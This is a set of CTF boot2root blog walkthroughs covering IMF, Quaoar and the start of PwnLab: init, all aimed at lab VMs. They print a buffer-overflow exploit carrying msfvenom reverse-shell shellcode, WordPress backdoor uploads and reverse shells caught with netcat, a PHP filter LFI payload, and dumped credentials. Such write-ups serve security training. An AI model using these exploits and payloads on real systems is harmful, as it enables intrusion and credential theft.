<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">target</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">145.130</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">7788</span>
</span><span class='line'><span class="n">agentid</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">48093572</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">menu</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">3</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">145.129</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">8888</span> <span class="o">-</span><span class="n">f</span> <span class="n">python</span> <span class="o">-</span><span class="n">o</span> <span class="n">killagent</span><span class="o">.</span><span class="n">py</span> <span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="c"># b &amp;ldquo;\x00\x0a\x0d&amp;rdquo;&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Size</span><span class="p">:</span> <span class="mi">95</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">buf</span> <span class="o">=</span>  <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xbb</span>\<span class="n">x6e</span>\<span class="n">x01</span>\<span class="n">x4b</span>\<span class="n">xcb</span>\<span class="n">xdb</span>\<span class="n">xcc</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x5e</span>\<span class="n">x31</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc9</span>\<span class="n">xb1</span>\<span class="n">x12</span>\<span class="n">x31</span>\<span class="n">x5e</span>\<span class="n">x12</span>\<span class="n">x03</span>\<span class="n">x5e</span>\<span class="n">x12</span>\<span class="n">x83</span>\<span class="n">xa8</span>\<span class="n">x05</span>\<span class="n">xa9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x3e</span>\<span class="n">x05</span>\<span class="n">xdd</span>\<span class="n">xda</span>\<span class="n">x22</span>\<span class="n">x36</span>\<span class="n">xa2</span>\<span class="n">x77</span>\<span class="n">xcf</span>\<span class="n">xba</span>\<span class="n">xad</span>\<span class="n">x99</span>\<span class="n">xbf</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xdc</span>\<span class="n">x60</span>\<span class="n">xd9</span>\<span class="n">x53</span>\<span class="n">x79</span>\<span class="n">xcb</span>\<span class="n">xe5</span>\<span class="n">x9e</span>\<span class="n">xf9</span>\<span class="n">x62</span>\<span class="n">x63</span>\<span class="n">xd8</span>\<span class="n">x91</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb4</span>\<span class="n">x3b</span>\<span class="n">x8b</span>\<span class="n">xe0</span>\<span class="n">x5d</span>\<span class="n">x3e</span>\<span class="n">xac</span>\<span class="n">xc0</span>\<span class="n">x25</span>\<span class="n">xb7</span>\<span class="n">x4d</span>\<span class="n">xb4</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x98</span>\<span class="n">xdc</span>\<span class="n">xe7</span>\<span class="n">x0f</span>\<span class="n">x1b</span>\<span class="n">x56</span>\<span class="n">xe6</span>\<span class="n">xbd</span>\<span class="n">x9c</span>\<span class="n">x3a</span>\<span class="n">x80</span>\<span class="n">x53</span>\<span class="n">xb2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc9</span>\<span class="n">x38</span>\<span class="n">xc4</span>\<span class="n">xe3</span>\<span class="n">x02</span>\<span class="n">xda</span>\<span class="n">x7d</span>\<span class="n">x75</span>\<span class="n">xbf</span>\<span class="n">x48</span>\<span class="n">x2d</span>\<span class="n">x0c</span>\<span class="n">xa1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xdc</span>\<span class="n">xda</span>\<span class="n">xc3</span>\<span class="n">xa2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">168</span>
</span><span class='line'><span class="n">call</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x63</span>\<span class="n">x85</span>\<span class="n">x04</span>\<span class="n">x08</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">nop</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x90</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">pad</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="c"># 73 bytes&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">pad</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">call</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">agentid</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">menu</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="o">+&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Payload</span> <span class="n">sent</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">listener</span><span class="o">.&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>And what remains is to execute it:</p>

<p><code>
root@kali:~# python agentkill.py
Payload sent. Check your listener.
</code></p>

<p>And on the listener, mission accomplished!</p>

<p>```
nc -vnlp 8888
listening on [any] 8888 &hellip;
connect to [192.168.145.129] from (UNKNOWN) [192.168.145.130] 58634
whoami
root
ls /root
Flag.txt
TheEnd.txt
cat Flag.txt
flag6{R2gwc3RQcm90MGMwbHM=}
cat TheEnd.txt</p>

<hr />

<p>  /  <em>/</em> _  <strong><em>  </em></strong>  <strong><em> </em></strong> (<em>) /  / /__
 </em>/ //  &lsquo; \/ _ \/ _ (<em>&ndash;&lt;(</em>&ndash;&lt;/ / _ \/ / &ndash;<em>)
/</em><strong>/<em>/</em>/_/ .</strong>/_<strong>/</strong><em>/</em><strong>/<em>/</em>.</strong>/<em>/_</em>/
   <strong>  </strong>/<em>/        _                    <br/>
  /  |/  (</em>)<strong> </strong><em> (</em>)<strong>  </strong><em>            <br/>
 / /|</em>/ / (<em>&ndash;&lt;(</em>&ndash;&lt;/ / _ \/ _ \           <br/>
/<em>/__/</em>/<em>/</em><strong>/</strong><em>/</em>/_<strong>/<em>//</em>/           <br/>
  / </strong>/<strong>  </strong><strong><em><em><strong><strong><em>                   <br/>
 / </em>// _ \/ </strong>/ </strong>/ &ndash;</em>)                  <br/>
/</em>/  _</strong>/<em>/  _</em>/__/</p>

<p>Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
Thank you for trying this challenge and please send any feedback.</p>

<p>Geckom
Twitter: @g3ck0ma
Email: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x67;&#x65;&#99;&#107;&#x6f;&#109;&#x40;&#114;&#101;&#x64;&#x74;&#x65;&#x61;&#109;&#114;&#46;&#x63;&#111;&#109;">&#103;&#101;&#99;&#x6b;&#111;&#109;&#x40;&#x72;&#101;&#100;&#116;&#101;&#x61;&#x6d;&#114;&#x2e;&#99;&#111;&#109;</a>
Web: <a href="http://redteamr.com">http://redteamr.com</a></p>

<p>Special Thanks
Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
Web Advice: Menztrual (@menztrual)
Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)
```</p>

<p>And the final decoded flag is <code>Gh0stProt0c0ls</code>! This was a really nice challenge in the later stages, especially from flag 3 onwards! Hats off to Geckom and the collaborators for this interesting VM!</p>

<p>As a recap, from only a web server available to root:</p>

<ul>
<li>HTML source &ndash;> JS included files &ndash;> PHP function exploitation &ndash;> SQLi &ndash;> directory bruteforcing &ndash;> PHP shell upload &ndash;> binary exploitation &ndash;> root</li>
</ul>


<p>```</p>

<hr />

<p>/ It is by the fortune of God that, in   \
| this country, we have three benefits:  |
| freedom of speech, freedom of thought, |
| and the wisdom never to use either.    |
|                                        |
\ &mdash; Mark Twain                          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016: Quaoar]]></title>
    <link href="http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar/"/>
    <updated>2018-09-21T10:37:53-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was created for the Hackfest 2016 CTF. The goal is to become root and get a flag on the machine.</p>

<!-- more -->


<p>Nmap shows SSH, Samba, a web server and mail services running on the target:</p>

<p><code>
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: post-login have more capabilities Pre-login LOGINDISABLEDA0001 LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID STARTTLS IMAP4rev1 IDLE SASL-IR
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: post-login more capabilities Pre-login have LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID AUTH=PLAINA0001 IMAP4rev1 IDLE SASL-IR
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; +1s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:40+00:00; +1s from scanner time.
</code></p>

<p>On the web server there are some pictures with planets and the message &ldquo;Hack The Planet&rdquo;. But there are entries in robots.txt:</p>

<p>```
Disallow: Hackers
Allow: /wordpress/</p>

<hr />

<h1>/<em><strong> _   _  </strong> _  </em><strong>   </strong> _ _ __</h1>

<h1>//  / / | | |/ _<code>|/ _ \ / _</code> | &lsquo;__|</h1>

<h1>/ _/ /| |<em>| | (</em>| | (<em>) | (</em>| | |</h1>

<h1>_<strong>,<em>\ _</em>,<em>|_</em>,_|_</strong>/ _<em>,</em>|_|</h1>

<p>```</p>

<p>No directory called hackers but there is a Wordpress blog :p</p>

<p><img class="center" src="/images/pentest/quaoar/quaoar_blog.png" title="&lsquo;wordpress&rsquo; &lsquo;wordpress blog&rsquo;" ></p>

<p>Naturally, I ran Wpscan, and it found 2 usernames:</p>

<p>```
[+] Enumerating usernames &hellip;
[+] We identified the following 2 users:</p>

<pre><code>+----+--------+--------+
| ID | Login  | Name   |
+----+--------+--------+
| 1  | admin  | admin  |
| 2  | wpuser | wpuser |
+----+--------+--------+
</code></pre>

<p>```</p>

<p>A prelimiary check for default credentials actually revealed the password for the admin user is..you will never guess it..admin! For receiving a shell, I wanted to try a new tool: <a href="https://github.com/n00py/WPForce">WPForce</a>!</p>

<blockquote><p>WPForce is a suite of Wordpress Attack tools. Currently this contains 2 scripts &ndash; WPForce, which
brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been
found. Yertle also contains a number of post exploitation modules.</p></blockquote>

<p>I used the <code>yertle.py</code> script to upload a backdoor:</p>

<p>```
python yertle.py -u &ldquo;admin&rdquo; -p &ldquo;admin&rdquo; -t &ldquo;<a href="http://192.168.217.145/wordpress">http://192.168.217.145/wordpress</a>&rdquo; -i</p>

<pre><code> _..---.--.    __   __        _   _
</code></pre>

<p>   .&lsquo;\ <strong>|/O.</strong>)   \ \ / /<strong> _ </strong>| |<em>| | </em><strong>
  /</strong>.&rsquo; <em>/ .&ndash;&lsquo;</em>\    \ V / _ \ &rsquo;<strong>| </strong>| |/ _ .
 (<strong><em><em>.&lsquo;.&ndash;</em>_</em></strong>)    | |  <strong>/ |  | |_| |  </strong>/
  (<em>/ </em>)<strong>(<em> _)_   |</em>|_</strong>|<em>|   _</em>|<em>|___|
   (</em>..)&mdash;(.._)&rsquo;&mdash;&lsquo;         ~n00py~</p>

<pre><code>  Post-exploitation Module for Wordpress
                 v.1.1.0
</code></pre>

<p>Backdoor uploaded!
Upload Directory: cpucqjc
os-shell> whoami
Sent command: whoami
www-data
os-shell> pwd
Sent command: pwd
/var/www/wordpress/wp-content/plugins/cpucqjc
```</p>

<p>Time to snoop around! I was able to read <code>/var/www/wordpress/wp-config.php</code> and inside found credentials for the SQL database:</p>

<p>```
/<em>* MySQL database username </em>/
define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>

<p>/<em>* MySQL database password </em>/
define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;rootpassword!&rsquo;);
```</p>

<p>I also found a flag inside <em>wpadmin</em>&rsquo;s home directory:</p>

<p><code>
os-shell&gt; cat /home/wpadmin/flag.txt
Sent command: cat /home/wpadmin/flag.txt
2bafe61f03117ac66a73c3c514de796e
</code></p>

<p>I found the shell I had pretty restrictive so I used Yertle to get a reverse shell that I could upgrade:</p>

<p><code>
os-shell&gt; shell
IP Address: 192.168.217.132
Port: 8888
Sending reverse shell to 192.168.217.132 port 8888
</code></p>

<p>And on my listener side:</p>

<p><code>
nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.145] 50713
bash: no job control in this shell
www-data@Quaoar:/var/www/wordpress/wp-content/plugins/cpucqjc$
</code></p>

<p>I used Python to spawn a TTY and then I tried the root credentials for a pleasant surprise. They are the actual credentials of the root user!</p>

<p><code>
root@Quaoar:~# cat /root/flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
</code></p>

<p>And that was it for this challenge!</p>

<p>```</p>

<hr />

<p>/ Be cheerful while you are alive. \
|                                  |
\ &mdash; Phathotep, 24th Century B.C.  /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwnlab: init]]></title>
    <link href="http://chousensha.github.io/blog/2018/08/25/pwnlab-init/"/>
    <updated>2018-08-25T17:01:13-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/08/25/pwnlab-init</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s boot2root is called PwnLab: init and the goal is to read the flag in /root/flag.txt</p>

<!-- more -->


<p><code>
Nmap scan report for 192.168.164.129
Host is up (0.00099s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          37397/udp  status
|_  100024  1          58026/tcp  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, LongColumnFlag, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, LongPassword, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: pKc2lJniDVf|]&lt;Rg2bwQ
|_  Auth Plugin Name: 88
58026/tcp open  status  1 (RPC #100024)
</code></p>

<p>The website is an intranet portal for uploading images, but we have to login first.</p>

<p><img class="center" src="/images/pentest/pwnlab_init/web.jpg" title="&lsquo;web server&rsquo; &lsquo;intranet portal&rsquo;" ></p>

<p>I ran Nikto on it but there were no interesting finds, except for the following line:</p>

<p><code>
+ /config.php: PHP Config file may contain database IDs and passwords.
</code></p>

<p>However, when I tried to read that file, all I got was a blank page. I&rsquo;ve noticed that the URLs for the pages look like this: <a href="http://192.168.164.129/?page=login">http://192.168.164.129/?page=login</a> for the login page and <a href="http://192.168.164.129/?page=upload">http://192.168.164.129/?page=upload</a> for the upload page. I tried some directory traversal and file inclusion techniques, thinking that this might be the way of reading the config.php file, but had no luck. However, as I was searching for a way on the internet, I came across this article on a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI method that uses PHP filters</a>. The below command allows reading the source of PHP files by using the filter functionality to base64 encode the contents of the file before reading it:</p>

<p><code>url?page=php://filter/convert.base64-encode/resource=config</code></p>

<p>This returned a base64 string that when decoded, gave me the MySQL credentials:</p>

<p><code>
&lt;?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?&gt;
</code></p>

<p>Now we can connect to that database:</p>

<p>```
mysql -u root -h 192.168.217.143
ERROR 1045 (28000): Access denied for user &lsquo;root&rsquo;@&lsquo;192.168.217.132&rsquo; (using password: NO)
root@kali:~# mysql -u root -p -h 192.168.217.143
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 41
Server version: 5.5.47-0+deb8u1 (Debian)</p>

<p>Copyright &copy; 2000, 2017, Oracle, MariaDB Corporation Ab and others.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>MySQL [(none)]> use Users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A</p>

<p>Database changed
MySQL [Users]><br/>
```</p>

<p>Let&rsquo;s see what we have here:</p>

<p><code>
MySQL [Users]&gt; show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
MySQL [Users]&gt; select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.05 sec)
</code></p>

<p>3 users with base64 encoded passwords!</p>

<p><code>
kent / JWzXuBJJNy
mike / SIfdsTEn6I
kane / iSv5Ym2GRo
</code></p>

<p>I logged in as kent and tried uploading a PHP reverse shell, but got an error stating that the file type is not allowed. Using the previous LFI method, let&rsquo;s take a look at the source code of the upload page:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">user</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">You</span> <span class="nx">must</span> <span class="nx">be</span> <span class="nx">log</span> <span class="nx">in</span><span class="o">.&amp;</span><span class="nx">rsquo</span><span class="p">;);</span> <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;&amp;lt;body&amp;gt;</span>
</span><span class='line'><span class="x">    &amp;lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&amp;gt;</span>
</span><span class='line'><span class="x">        &amp;lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&amp;gt;</span>
